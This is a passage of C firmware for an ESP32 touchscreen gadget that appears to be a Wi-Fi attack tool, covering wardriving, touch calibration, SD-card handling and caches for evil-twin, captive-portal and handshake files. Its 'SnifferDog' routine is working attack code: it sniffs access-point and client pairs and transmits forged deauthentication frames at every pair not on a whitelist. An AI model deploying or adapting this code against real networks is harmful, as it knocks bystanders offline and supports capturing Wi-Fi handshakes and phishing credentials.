             (int)((timestamp_counter / 3600) % 24),
             (int)((timestamp_counter / 60) % 60), 
             (int)(timestamp_counter % 60));
}

static const char* get_auth_mode_wiggle(wifi_auth_mode_t mode) {
    switch(mode) {
        case WIFI_AUTH_OPEN:
            return "Open";
        case WIFI_AUTH_WEP:
            return "WEP";
        case WIFI_AUTH_WPA_PSK:
            return "WPA_PSK";
        case WIFI_AUTH_WPA2_PSK:
            return "WPA2_PSK";
        case WIFI_AUTH_WPA_WPA2_PSK:
            return "WPA_WPA2_PSK";
        case WIFI_AUTH_WPA2_ENTERPRISE:
            return "WPA2_ENTERPRISE";
        case WIFI_AUTH_WPA3_PSK:
            return "WPA3_PSK";
        case WIFI_AUTH_WPA2_WPA3_PSK:
            return "WPA2_WPA3_PSK";
        case WIFI_AUTH_WAPI_PSK:
            return "WAPI_PSK";
        default:
            return "Unknown";
    }
}

static bool wait_for_gps_fix(int timeout_seconds) {
    int elapsed = 0;
    current_gps.valid = false;
    
    ESP_LOGI(TAG, "Waiting for GPS fix (timeout: %d seconds)...", timeout_seconds);
    
    while (elapsed < timeout_seconds) {
        if (!wardrive_active) {
            ESP_LOGI(TAG, "GPS wait: Stop requested");
            return false;
        }
        
        int len = uart_read_bytes(GPS_UART_NUM, (uint8_t*)wardrive_gps_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(1000));
        if (len > 0) {
            wardrive_gps_buffer[len] = '\0';
            char* line = strtok(wardrive_gps_buffer, "\r\n");
            while (line != NULL) {
                if (parse_gps_nmea(line)) {
                    if (current_gps.valid) {
                        return true;
                    }
                }
                line = strtok(NULL, "\r\n");
            }
        }
        
        elapsed++;
        if (elapsed % 10 == 0) {
            ESP_LOGI(TAG, "Still waiting for GPS fix... (%d/%d seconds)", elapsed, timeout_seconds);
        }
    }
    
    return false;
}

// Snifferdog channel hopping
static void sniffer_dog_channel_hop(void) {
    if (!sniffer_dog_active) {
        return;
    }
    
    sniffer_dog_current_channel = dual_band_channels[sniffer_dog_channel_index];
    sniffer_dog_channel_index++;
    if (sniffer_dog_channel_index >= dual_band_channels_count) {
        sniffer_dog_channel_index = 0;
    }
    
    esp_wifi_set_channel(sniffer_dog_current_channel, WIFI_SECOND_CHAN_NONE);
    sniffer_dog_last_channel_hop = esp_timer_get_time() / 1000;
}

// Snifferdog channel hopping task
static void sniffer_dog_task(void *pvParameters) {
    (void)pvParameters;
    
    ESP_LOGI(TAG, "SnifferDog channel hop task started");
    
    while (sniffer_dog_active) {
        vTaskDelay(pdMS_TO_TICKS(50));
        
        if (!sniffer_dog_active) {
            continue;
        }
        
        int64_t current_time = esp_timer_get_time() / 1000;
        bool time_expired = (current_time - sniffer_dog_last_channel_hop >= sniffer_channel_hop_delay_ms);
        
        if (time_expired) {
            sniffer_dog_channel_hop();
        }
    }
    
    ESP_LOGI(TAG, "SnifferDog channel hop task ending");
    sniffer_dog_task_handle = NULL;
    vTaskDelete(NULL);
}

// Snifferdog promiscuous callback - captures AP-STA pairs and sends deauth
static void sniffer_dog_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!sniffer_dog_active) {
        return;
    }
    
    // Filter only MGMT and DATA packets
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) {
        return;
    }
    
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    
    if (len < 24) {
        return;
    }
    
    // Parse 802.11 header
    uint8_t frame_type = frame[0] & 0xFC;
    uint8_t to_ds = (frame[1] & 0x01) != 0;
    uint8_t from_ds = (frame[1] & 0x02) != 0;
    
    // Extract addresses
    uint8_t *addr1 = (uint8_t *)&frame[4];
    uint8_t *addr2 = (uint8_t *)&frame[10];
    
    uint8_t *ap_mac = NULL;
    uint8_t *sta_mac = NULL;
    
    // Identify AP and STA based on frame type and DS bits
    if (type == WIFI_PKT_DATA) {
        if (to_ds && !from_ds) {
            sta_mac = addr2;
            ap_mac = addr1;
        } else if (!to_ds && from_ds) {
            ap_mac = addr2;
            sta_mac = addr1;
        } else {
            return;
        }
    } else if (type == WIFI_PKT_MGMT) {
        switch (frame_type) {
            case 0x00: // Association Request
            case 0x20: // Reassociation Request
            case 0xB0: // Authentication
                sta_mac = addr2;
                ap_mac = addr1;
                break;
            case 0x10: // Association Response
            case 0x30: // Reassociation Response
                ap_mac = addr2;
                sta_mac = addr1;
                break;
            default:
                return;
        }
    }
    
    if (!ap_mac || !sta_mac) {
        return;
    }
    
    // Skip broadcast/multicast addresses
    if (is_broadcast_bssid(ap_mac) || is_broadcast_bssid(sta_mac) ||
        is_multicast_mac(ap_mac) || is_multicast_mac(sta_mac) ||
        is_own_device_mac(ap_mac) || is_own_device_mac(sta_mac)) {
        return;
    }
    
    // Check if AP BSSID is whitelisted
    if (is_bssid_whitelisted(ap_mac)) {
        return;
    }
    
    // Send deauth frame from AP to STA
    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    
    memcpy(&deauth_frame[4], sta_mac, 6);   // Destination: specific STA
    memcpy(&deauth_frame[10], ap_mac, 6);   // Source: AP
    memcpy(&deauth_frame[16], ap_mac, 6);   // BSSID: AP
    
    // Log deauth packet info: SSID (unknown when sniffing), BSSID, Channel
    ESP_LOGI(TAG, "[SNIFFERDOG] SSID: %-32s | BSSID: %02X:%02X:%02X:%02X:%02X:%02X | CH: %2d | STA: %02X:%02X:%02X:%02X:%02X:%02X",
             "(sniffed-unknown)",
             ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5],
             sniffer_dog_current_channel,
             sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5]);
    
    // Log raw deauth frame bytes (hex)
    {
        char hexbuf[3 * sizeof(deauth_frame_default) + 1];
        char *p = hexbuf;
        for (size_t i = 0; i < sizeof(deauth_frame_default); i++) {
            int written = sprintf(p, "%02X", deauth_frame[i]);
            p += written;
            if (i + 1 < sizeof(deauth_frame_default)) {
                *p++ = ' ';
            }
        }
        *p = '\0';
        //ESP_LOGI(TAG, "[SNIFFERDOG] DEAUTH RAW: %s", hexbuf);
    }

    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame_default), false);
    portENTER_CRITICAL(&snifferdog_stats_spin);
    snifferdog_kick_count++;
    snprintf(snifferdog_last_pair, sizeof(snifferdog_last_pair),
             "%02X:%02X:%02X:%02X:%02X:%02X\n->%02X:%02X:%02X:%02X:%02X:%02X",
             ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5],
             sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5]);
    portEXIT_CRITICAL(&snifferdog_stats_spin);
}

// Sniffer task - calls wifi_sniffer_start and runs until stopped
static void sniffer_task(void *pvParameters) {
    (void)pvParameters;
    
    ESP_LOGI(TAG, "Sniffer task started");
    
    // Start wifi_sniffer
    esp_err_t ret = wifi_sniffer_start();
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to start wifi_sniffer: %s", esp_err_to_name(ret));
        sniffer_task_active = false;
        sniffer_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }
    
    // Keep task running until sniffer_task_active is set to false
    while (sniffer_task_active) {
        vTaskDelay(pdMS_TO_TICKS(1000));
    }
    
    // Stop wifi_sniffer
    wifi_sniffer_stop();
    
    ESP_LOGI(TAG, "Sniffer task ending");
    sniffer_task_handle = NULL;
    vTaskDelete(NULL);
}

// ============================================================================
// Touch Calibration
// ============================================================================

static bool touch_cal_nvs_load(touch_cal_t *cal)
{
    nvs_handle_t h;
    if (nvs_open(TOUCH_CAL_NVS_NS, NVS_READONLY, &h) != ESP_OK) return false;
    uint16_t magic = 0;
    nvs_get_u16(h, "magic", &magic);
    bool ok = (magic == TOUCH_CAL_MAGIC);
    if (ok) {
        nvs_get_i32(h, "x_min",    &cal->x_min);
        nvs_get_i32(h, "x_max",    &cal->x_max);
        nvs_get_i32(h, "y_min",    &cal->y_min);
        nvs_get_i32(h, "y_max",    &cal->y_max);
        nvs_get_i32(h, "null_x",   &cal->null_x);
        nvs_get_i32(h, "null_y",   &cal->null_y);
        nvs_get_u8(h,  "invert_x", &cal->invert_x);
        nvs_get_u8(h,  "invert_y", &cal->invert_y);
        nvs_get_u8(h,  "swap_xy",  &cal->swap_xy);
    }
    nvs_close(h);
    return ok;
}

static void touch_cal_nvs_save(const touch_cal_t *cal)
{
    nvs_handle_t h;
    if (nvs_open(TOUCH_CAL_NVS_NS, NVS_READWRITE, &h) != ESP_OK) {
        ESP_LOGE(TAG, "touch_cal: nvs_open failed");
        return;
    }
    nvs_set_i32(h, "x_min",    cal->x_min);
    nvs_set_i32(h, "x_max",    cal->x_max);
    nvs_set_i32(h, "y_min",    cal->y_min);
    nvs_set_i32(h, "y_max",    cal->y_max);
    nvs_set_i32(h, "null_x",   cal->null_x);
    nvs_set_i32(h, "null_y",   cal->null_y);
    nvs_set_u8(h,  "invert_x", cal->invert_x);
    nvs_set_u8(h,  "invert_y", cal->invert_y);
    nvs_set_u8(h,  "swap_xy",  cal->swap_xy);
    nvs_set_u16(h, "magic",    TOUCH_CAL_MAGIC);
    nvs_commit(h);
    nvs_close(h);
    ESP_LOGI(TAG, "Touch calibration saved to NVS");
}

static void touch_cal_apply(const touch_cal_t *cal)
{
    xpt2046_set_calibration(&touch_handle,
                             (int)cal->x_min, (int)cal->x_max,
                             (int)cal->y_min, (int)cal->y_max);
    touch_handle.invert_x    = (bool)cal->invert_x;
    touch_handle.invert_y    = (bool)cal->invert_y;
    touch_handle.swap_xy     = (bool)cal->swap_xy;
    touch_handle.null_x      = (int)cal->null_x;
    touch_handle.null_y      = (int)cal->null_y;
    touch_handle.null_radius = (cal->null_x > 0 && cal->null_y > 0) ? TOUCH_CAL_NULL_RADIUS : 0;
    ESP_LOGI(TAG, "Touch cal: X%ld-%ld Y%ld-%ld inv(%d,%d) null(%ld,%ld)",
             cal->x_min, cal->x_max, cal->y_min, cal->y_max,
             cal->invert_x, cal->invert_y, cal->null_x, cal->null_y);
}

// --- Calibration UI (blocking; drives LVGL manually) ---

static void cal_tick(void)
{
    if (xSemaphoreTake(lvgl_mutex, pdMS_TO_TICKS(10)) == pdTRUE) {
        lv_timer_handler();
        xSemaphoreGive(lvgl_mutex);
    }
    vTaskDelay(pdMS_TO_TICKS(10));
}

static bool cal_in_null(int x, int y, int nx, int ny)
{
    if (nx <= 0 || ny <= 0) return false;
    int dx = x - nx, dy = y - ny;
    return (dx * dx + dy * dy) < (TOUCH_CAL_NULL_RADIUS * TOUCH_CAL_NULL_RADIUS);
}

// Wait for 8 consecutive stable reads not in the null zone; timeout_ms = 0 → wait forever
static bool cal_wait_touch(int nx, int ny, uint16_t *rx, uint16_t *ry, int timeout_ms)
{
    int64_t t0 = esp_timer_get_time() / 1000;
    uint16_t lx = 0, ly = 0;
    int stable = 0;
    for (;;) {
        cal_tick();
        if (timeout_ms > 0 && (esp_timer_get_time() / 1000 - t0) > timeout_ms) return false;
        uint16_t x, y;
        if (!xpt2046_read_raw_point(&touch_handle, &x, &y) || cal_in_null(x, y, nx, ny)) {
            stable = 0; lx = ly = 0;
            continue;
        }
        if (lx > 0 && abs((int)x - (int)lx) < 80 && abs((int)y - (int)ly) < 80) {
            if (++stable >= 8) { *rx = x; *ry = y; return true; }
        } else { stable = 1; }
        lx = x; ly = y;
    }
}

// Wait until touch is gone (readings absent or in null zone) for 8 polls
static void cal_wait_release(int nx, int ny)
{
    int count = 0;
    while (count < 8) {
        cal_tick();
        uint16_t x, y;
        bool t = xpt2046_read_raw_point(&touch_handle, &x, &y);
        count = (!t || cal_in_null(x, y, nx, ny)) ? count + 1 : 0;
    }
}

// Calibration target points [screen_x, screen_y]: TL, TR, BL
static const int16_t CAL_PTS[3][2] = { {20, 20}, {220, 20}, {20, 300} };

static void run_touch_calibration(void)
{
    ESP_LOGI(TAG, "Starting touch calibration");

    lv_obj_t *scr = lv_obj_create(NULL);
    lv_obj_set_style_bg_color(scr, lv_color_black(), 0);
    lv_obj_set_style_bg_opa(scr, LV_OPA_COVER, 0);
    lv_obj_set_style_border_width(scr, 0, 0);
    lv_obj_set_style_pad_all(scr, 0, 0);

    lv_obj_t *lbl = lv_label_create(scr);
    lv_obj_set_style_text_color(lbl, lv_color_white(), 0);
    lv_obj_set_style_text_font(lbl, &lv_font_montserrat_14, 0);
    lv_label_set_long_mode(lbl, LV_LABEL_LONG_WRAP);
    lv_obj_set_width(lbl, 200);
    lv_obj_align(lbl, LV_ALIGN_CENTER, 0, 50);

    lv_obj_t *hbar = lv_obj_create(scr);
    lv_obj_set_size(hbar, 32, 2);
    lv_obj_set_style_bg_color(hbar, lv_color_white(), 0);
    lv_obj_set_style_bg_opa(hbar, LV_OPA_COVER, 0);
    lv_obj_set_style_border_width(hbar, 0, 0);
    lv_obj_set_style_radius(hbar, 0, 0);

    lv_obj_t *vbar = lv_obj_create(scr);
    lv_obj_set_size(vbar, 2, 32);
    lv_obj_set_style_bg_color(vbar, lv_color_white(), 0);
    lv_obj_set_style_bg_opa(vbar, LV_OPA_COVER, 0);
    lv_obj_set_style_border_width(vbar, 0, 0);
    lv_obj_set_style_radius(vbar, 0, 0);
    lv_obj_add_flag(hbar, LV_OBJ_FLAG_HIDDEN);
    lv_obj_add_flag(vbar, LV_OBJ_FLAG_HIDDEN);

    lv_scr_load(scr);
    for (int i = 0; i < 5; i++) cal_tick();

    // Step 0: measure resting null zone (2 s, do not touch)
    lv_label_set_text(lbl, "Calibrating...\nDo NOT touch screen.");
    for (int i = 0; i < 3; i++) cal_tick();

    int64_t t_end = esp_timer_get_time() / 1000 + 2000;
    int32_t nxs = 0, nys = 0; int nn = 0;
    while (esp_timer_get_time() / 1000 < t_end) {
        cal_tick();
        uint16_t x, y;
        if (xpt2046_read_raw_point(&touch_handle, &x, &y)) {
            nxs += x; nys += y; nn++;
        }
    }
    int null_x = (nn > 0) ? (int)(nxs / nn) : 0;
    int null_y = (nn > 0) ? (int)(nys / nn) : 0;
    ESP_LOGI(TAG, "Null zone raw=(%d,%d) n=%d", null_x, null_y, nn);

    // Steps 1–3: collect 3 calibration points
    uint16_t raw_x[3], raw_y[3];
    const char *pt_lbl[3] = {
        "Touch the [+]\nTop-Left  (1/3)",
        "Touch the [+]\nTop-Right (2/3)",
        "Touch the [+]\nBottom-Left (3/3)"
    };

    for (int pt = 0; pt < 3; pt++) {
        int tx = CAL_PTS[pt][0], ty = CAL_PTS[pt][1];
        lv_obj_set_pos(hbar, tx - 16, ty - 1);
        lv_obj_set_pos(vbar, tx - 1,  ty - 16);
        lv_obj_clear_flag(hbar, LV_OBJ_FLAG_HIDDEN);
        lv_obj_clear_flag(vbar, LV_OBJ_FLAG_HIDDEN);
        lv_label_set_text(lbl, pt_lbl[pt]);
        for (int i = 0; i < 3; i++) cal_tick();

        cal_wait_release(null_x, null_y);

        if (!cal_wait_touch(null_x, null_y, &raw_x[pt], &raw_y[pt], 15000)) {
            ESP_LOGW(TAG, "Calibration timeout at point %d — aborting", pt + 1);
            lv_obj_clean(scr);  // strip cal widgets; scr stays active for create_home_ui
            return;
        }
        ESP_LOGI(TAG, "Cal[%d] screen(%d,%d) → raw(%u,%u)", pt+1, tx, ty, raw_x[pt], raw_y[pt]);
    }

    // Derive calibration from two X points (TL,TR) and two Y points (TL,BL)
    float xscale = (float)((int)raw_x[1] - (int)raw_x[0]) / (CAL_PTS[1][0] - CAL_PTS[0][0]);
    int x_at_0   = (int)raw_x[0] - (int)(CAL_PTS[0][0] * xscale);
    int x_at_239 = (int)raw_x[1] + (int)((LV_HOR_RES - 1 - CAL_PTS[1][0]) * xscale);

    float yscale = (float)((int)raw_y[2] - (int)raw_y[0]) / (CAL_PTS[2][1] - CAL_PTS[0][1]);
    int y_at_0   = (int)raw_y[0] - (int)(CAL_PTS[0][1] * yscale);
    int y_at_319 = (int)raw_y[2] + (int)((LV_VER_RES - 1 - CAL_PTS[2][1]) * yscale);

    touch_cal_t cal;
    cal.invert_x = (uint8_t)(x_at_0 > x_at_239);
    cal.x_min    = (int32_t)(cal.invert_x ? x_at_239 : x_at_0);
    cal.x_max    = (int32_t)(cal.invert_x ? x_at_0   : x_at_239);
    cal.invert_y = (uint8_t)(y_at_0 > y_at_319);
    cal.y_min    = (int32_t)(cal.invert_y ? y_at_319 : y_at_0);
    cal.y_max    = (int32_t)(cal.invert_y ? y_at_0   : y_at_319);
    cal.swap_xy  = 0;
    cal.null_x   = (int32_t)null_x;
    cal.null_y   = (int32_t)null_y;

    ESP_LOGI(TAG, "Cal: X%ld-%ld(inv=%d) Y%ld-%ld(inv=%d) null(%ld,%ld)",
             cal.x_min, cal.x_max, cal.invert_x,
             cal.y_min, cal.y_max, cal.invert_y,
             cal.null_x, cal.null_y);

    touch_cal_nvs_save(&cal);
    touch_cal_apply(&cal);

    lv_label_set_text(lbl, "Calibration done!");
    lv_obj_add_flag(hbar, LV_OBJ_FLAG_HIDDEN);
    lv_obj_add_flag(vbar, LV_OBJ_FLAG_HIDDEN);
    int64_t t_done = esp_timer_get_time() / 1000 + 1500;
    while (esp_timer_get_time() / 1000 < t_done) cal_tick();

    // Strip cal widgets off the screen without deleting it — lv_scr_load sets
    // disp->prev_scr which remains a dangling pointer after lv_obj_del(scr),
    // causing a load-access fault in the next lv_timer_handler call.
    // lv_obj_clean leaves scr as the active screen; create_home_ui() populates it.
    lv_obj_clean(scr);
    ESP_LOGI(TAG, "Touch calibration complete");
}

static void init_touch(void)
{
    esp_err_t ret = xpt2046_init(&touch_handle, LCD_HOST, TOUCH_CS, LCD_H_RES, LCD_V_RES);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "XPT2046 touch init failed: %s", esp_err_to_name(ret));
        return;
    }
    ESP_LOGI(TAG, "XPT2046 touch initialised (SPI polling mode, CS=GPIO%d)", TOUCH_CS);

    // Load calibration from NVS; if absent use hardware-observed defaults for NM-CYD-C5
    touch_cal_t cal;
    if (touch_cal_nvs_load(&cal)) {
        touch_cal_apply(&cal);
        touch_cal_loaded = true;
        ESP_LOGI(TAG, "Touch calibration loaded from NVS");
    } else {
        // Default orientation observed on NM-CYD-C5: both axes inverted
        touch_handle.invert_x = true;
        touch_handle.invert_y = true;
        touch_handle.swap_xy  = false;
        ESP_LOGI(TAG, "No NVS touch cal — using default invert_x/y; calibration needed");
    }
}

static void log_sd_root_listing(void)
{
    DIR *dir = opendir("/sdcard");
    if (!dir) {
        ESP_LOGW(TAG, "opendir(/sdcard) failed");
        return;
    }
    ESP_LOGI(TAG, "SD root listing:");
    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        char path[256];
        int safe_len = (int)sizeof(path) - 9; // 256 - 1 (NUL) - strlen("/sdcard/") = 247
        if (safe_len < 0) safe_len = 0;
        snprintf(path, sizeof(path), "/sdcard/%.*s", safe_len, entry->d_name);
        struct stat st;
        if (stat(path, &st) == 0) {
            if (S_ISDIR(st.st_mode)) {
                ESP_LOGI(TAG, "  [DIR] %s", entry->d_name);
            } else {
                ESP_LOGI(TAG, "  %s (%ld bytes)", entry->d_name, (long)st.st_size);
            }
        } else {
            ESP_LOGI(TAG, "  %s", entry->d_name);
        }
    }
    closedir(dir);
}

// SD card lazy mount - call once before using /sdcard
static bool sd_mounted_lazy = false;
static SemaphoreHandle_t sd_mount_mutex = NULL;
static TaskHandle_t sd_lazy_mount_task = NULL;

// Background task to mount SD lazily
static void sd_lazy_mount_task_fn(void *param)
{
    vTaskDelay(pdMS_TO_TICKS(2000));  // Wait 2s after startup
    
    ESP_LOGI(TAG, "[SD_LAZY] Background SD mount task starting...");
    
    // Try to mount SD without blocking
    esp_err_t ret = wifi_wardrive_init_sd();
    if (ret == ESP_OK) {
        sd_mounted_lazy = true;
        ESP_LOGI(TAG, "[SD_LAZY] SD card mounted successfully in background");
        
        // Load whitelist now that SD is mounted
        load_whitelist_from_sd();
    } else {
        ESP_LOGW(TAG, "[SD_LAZY] SD mount failed: %s (system works without SD)", esp_err_to_name(ret));
    }
    
    vTaskDelete(NULL);
}

static esp_err_t ensure_sd_mounted(void)
{
    // Quick check: already mounted
    if (sd_mounted_lazy) {
        return ESP_OK;
    }
    
    // SD not mounted yet - mount now (blocking with timeout protection)
    ESP_LOGI(TAG, "[SD_MOUNT] Attempting to mount SD card on demand...");
    esp_err_t ret = wifi_wardrive_init_sd();
    
    if (ret == ESP_OK) {
        sd_mounted_lazy = true;
        ESP_LOGI(TAG, "[SD_MOUNT] SD card mounted successfully on demand");
        return ESP_OK;
    } else {
        ESP_LOGW(TAG, "[SD_MOUNT] SD mount failed: %s", esp_err_to_name(ret));
        return ret;  // Return error to caller
    }
}

// SD card init task with larger stack to prevent stack overflow
static void sd_init_task(void *param)
{
    // This task is now disabled - SD is mounted lazily in background
    ESP_LOGI(TAG, "[SD_TASK] SD init task disabled (lazy mount)");
    vTaskDelete(NULL);
}

// Load whitelist from SD card
void load_whitelist_from_sd(void) {
    whitelistedBssidsCount = 0; // Reset count
    
    ESP_LOGI(TAG, "Loading whitelist from /sdcard/lab/white.txt...");
    
    // Try to open the file - if SD not mounted, this will fail gracefully
    // Don't try to mount SD here - let it be mounted elsewhere
    FILE *file = fopen("/sdcard/lab/white.txt", "r");
    if (file == NULL) {
        ESP_LOGI(TAG, "white.txt not found or SD not accessible - whitelist will be empty");
        return;
    }
    
    ESP_LOGI(TAG, "Found white.txt, loading whitelisted BSSIDs...");
    
    char line[128];
    int line_number = 0;
    int loaded_count = 0;
    
    while (fgets(line, sizeof(line), file) != NULL && whitelistedBssidsCount < MAX_WHITELISTED_BSSIDS) {
        line_number++;
        
        // Remove trailing newline/whitespace
        line[strcspn(line, "\r\n")] = '\0';
        
        // Skip empty lines
        if (strlen(line) == 0) {
            continue;
        }
        
        // Parse BSSID in format: XX:XX:XX:XX:XX:XX or XX-XX-XX-XX-XX-XX
        uint8_t bssid[6];
        int matches = 0;
        
        // Try with colon separator
        matches = sscanf(line, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                        &bssid[0], &bssid[1], &bssid[2],
                        &bssid[3], &bssid[4], &bssid[5]);
        
        // If that didn't work, try with dash separator
        if (matches != 6) {
            matches = sscanf(line, "%hhx-%hhx-%hhx-%hhx-%hhx-%hhx",
                            &bssid[0], &bssid[1], &bssid[2],
                            &bssid[3], &bssid[4], &bssid[5]);
        }
        
        if (matches == 6) {
            // Valid BSSID found, add to whitelist
            memcpy(whiteListedBssids[whitelistedBssidsCount].bssid, bssid, 6);
            whitelistedBssidsCount++;
            loaded_count++;
            
            ESP_LOGI(TAG, "  [%d] Loaded: %02X:%02X:%02X:%02X:%02X:%02X",
                     loaded_count,
                     bssid[0], bssid[1], bssid[2],
                     bssid[3], bssid[4], bssid[5]);
        } else {
            ESP_LOGI(TAG, "  Line %d: Invalid BSSID format, ignoring: %s", line_number, line);
        }
    }
    
    fclose(file);
    
    if (whitelistedBssidsCount > 0) {
        ESP_LOGI(TAG, "Successfully loaded %d whitelisted BSSID(s)", whitelistedBssidsCount);
    } else {
        ESP_LOGI(TAG, "No valid BSSIDs found in white.txt");
    }
}

// Check if a BSSID is in the whitelist
bool is_bssid_whitelisted(const uint8_t *bssid) {
    if (bssid == NULL || whitelistedBssidsCount == 0) {
        return false;
    }
    
    for (int i = 0; i < whitelistedBssidsCount; i++) {
        if (memcmp(bssid, whiteListedBssids[i].bssid, 6) == 0) {
            return true;
        }
    }
    
    return false;
}

// ============================================================================
// SD Cache Functions
// ============================================================================

static esp_err_t sd_cache_init(void) {
    if (sd_cache != NULL) {
        ESP_LOGW(TAG, "SD cache already initialized");
        return ESP_OK;
    }
    
    // Allocate main structure in PSRAM
    sd_cache = (sd_cache_t *)heap_caps_calloc(1, sizeof(sd_cache_t), MALLOC_CAP_SPIRAM);
    if (sd_cache == NULL) {
        ESP_LOGE(TAG, "Failed to allocate SD cache structure in PSRAM");
        return ESP_ERR_NO_MEM;
    }
    
    // Allocate eviltwin entries array
    sd_cache->eviltwin_capacity = SD_CACHE_INITIAL_CAPACITY;
    sd_cache->eviltwin_entries = (char **)heap_caps_calloc(sd_cache->eviltwin_capacity, sizeof(char *), MALLOC_CAP_SPIRAM);
    if (sd_cache->eviltwin_entries == NULL) {
        ESP_LOGE(TAG, "Failed to allocate eviltwin entries array");
        return ESP_ERR_NO_MEM;
    }
    
    // Allocate portals entries array
    sd_cache->portals_capacity = SD_CACHE_INITIAL_CAPACITY;
    sd_cache->portals_entries = (char **)heap_caps_calloc(sd_cache->portals_capacity, sizeof(char *), MALLOC_CAP_SPIRAM);
    if (sd_cache->portals_entries == NULL) {
        ESP_LOGE(TAG, "Failed to allocate portals entries array");
        return ESP_ERR_NO_MEM;
    }
    
    // Allocate HTML filenames array
    sd_cache->html_filenames = (char **)heap_caps_calloc(SD_CACHE_MAX_HTML_FILES, sizeof(char *), MALLOC_CAP_SPIRAM);
    if (sd_cache->html_filenames == NULL) {
        ESP_LOGE(TAG, "Failed to allocate HTML filenames array");
        return ESP_ERR_NO_MEM;
    }
    
    // Allocate handshake names array
    sd_cache->handshake_names = (char **)heap_caps_calloc(SD_CACHE_MAX_HANDSHAKES, sizeof(char *), MALLOC_CAP_SPIRAM);
    if (sd_cache->handshake_names == NULL) {
        ESP_LOGE(TAG, "Failed to allocate handshake names array");
        return ESP_ERR_NO_MEM;
    }
    
    sd_cache->loaded = false;
    ESP_LOGI(TAG, "SD cache initialized in PSRAM");
    return ESP_OK;
}

// Add entry to eviltwin cache (dynamically grows if needed)
void sd_cache_add_eviltwin_entry(const char *entry) {
    if (sd_cache == NULL || entry == NULL) return;
    
    // Grow array if needed
    if (sd_cache->eviltwin_count >= sd_cache->eviltwin_capacity) {
        int new_capacity = sd_cache->eviltwin_capacity * 2;
        char **new_array = (char **)heap_caps_realloc(sd_cache->eviltwin_entries, 
                                                       new_capacity * sizeof(char *), MALLOC_CAP_SPIRAM);
        if (new_array == NULL) {
            ESP_LOGW(TAG, "Failed to grow eviltwin cache");
            return;
        }
        sd_cache->eviltwin_entries = new_array;
        sd_cache->eviltwin_capacity = new_capacity;
    }
    
    // Allocate and copy entry
    size_t len = strlen(entry);
    if (len > SD_CACHE_MAX_ENTRY_LEN - 1) len = SD_CACHE_MAX_ENTRY_LEN - 1;
    
    char *copy = (char *)heap_caps_malloc(len + 1, MALLOC_CAP_SPIRAM);
    if (copy == NULL) {
        ESP_LOGW(TAG, "Failed to allocate eviltwin entry");
        return;
    }
    memcpy(copy, entry, len);
    copy[len] = '\0';
    
    sd_cache->eviltwin_entries[sd_cache->eviltwin_count++] = copy;
}

// Add entry to portals cache (dynamically grows if needed)
void sd_cache_add_portal_entry(const char *entry) {
    if (sd_cache == NULL || entry == NULL) return;
    
    // Grow array if needed
    if (sd_cache->portals_count >= sd_cache->portals_capacity) {
        int new_capacity = sd_cache->portals_capacity * 2;
        char **new_array = (char **)heap_caps_realloc(sd_cache->portals_entries, 
                                                       new_capacity * sizeof(char *), MALLOC_CAP_SPIRAM);
        if (new_array == NULL) {
            ESP_LOGW(TAG, "Failed to grow portals cache");
            return;
        }
        sd_cache->portals_entries = new_array;
        sd_cache->portals_capacity = new_capacity;
    }
    
    // Allocate and copy entry
    size_t len = strlen(entry);
    if (len > SD_CACHE_MAX_ENTRY_LEN - 1) len = SD_CACHE_MAX_ENTRY_LEN - 1;
    
    char *copy = (char *)heap_caps_malloc(len + 1, MALLOC_CAP_SPIRAM);
    if (copy == NULL) {
        ESP_LOGW(TAG, "Failed to allocate portal entry");
        return;
    }
    memcpy(copy, entry, len);
    copy[len] = '\0';
    
    sd_cache->portals_entries[sd_cache->portals_count++] = copy;
}

// Add handshake filename to cache
void sd_cache_add_handshake_name(const char *name) {
    if (sd_cache == NULL || name == NULL) return;
    if (sd_cache->handshake_count >= SD_CACHE_MAX_HANDSHAKES) {
        ESP_LOGW(TAG, "Handshake cache full");
        return;
    }
    
    size_t len = strlen(name);
    if (len > SD_CACHE_MAX_FILENAME_LEN - 1) len = SD_CACHE_MAX_FILENAME_LEN - 1;
    
    char *copy = (char *)heap_caps_malloc(len + 1, MALLOC_CAP_SPIRAM);
    if (copy == NULL) {
        ESP_LOGW(TAG, "Failed to allocate handshake name");
        return;
    }
    memcpy(copy, name, len);
    copy[len] = '\0';
    
    sd_cache->handshake_names[sd_cache->handshake_count++] = copy;
}

// Add HTML filename to cache
static void sd_cache_add_html_filename(const char *name) {
    if (sd_cache == NULL || name == NULL) return;
    if (sd_cache->html_count >= SD_CACHE_MAX_HTML_FILES) {
        ESP_LOGW(TAG, "HTML filenames cache full");
        return;
    }
    
    size_t len = strlen(name);
    if (len > SD_CACHE_MAX_FILENAME_LEN - 1) len = SD_CACHE_MAX_FILENAME_LEN - 1;
    
    char *copy = (char *)heap_caps_malloc(len + 1, MALLOC_CAP_SPIRAM);
    if (copy == NULL) {
        ESP_LOGW(TAG, "Failed to allocate HTML filename");
        return;
    }
    memcpy(copy, name, len);
    copy[len] = '\0';
    
    sd_cache->html_filenames[sd_cache->html_count++] = copy;
}

// Getter functions for SD cache
int sd_cache_get_eviltwin_count(void) {
    return sd_cache ? sd_cache->eviltwin_count : 0;
}

const char* sd_cache_get_eviltwin_entry(int index) {
    if (sd_cache == NULL || index < 0 || index >= sd_cache->eviltwin_count) return NULL;
    return sd_cache->eviltwin_entries[index];
}

int sd_cache_get_portal_count(void) {
    return sd_cache ? sd_cache->portals_count : 0;
}

const char* sd_cache_get_portal_entry(int index) {
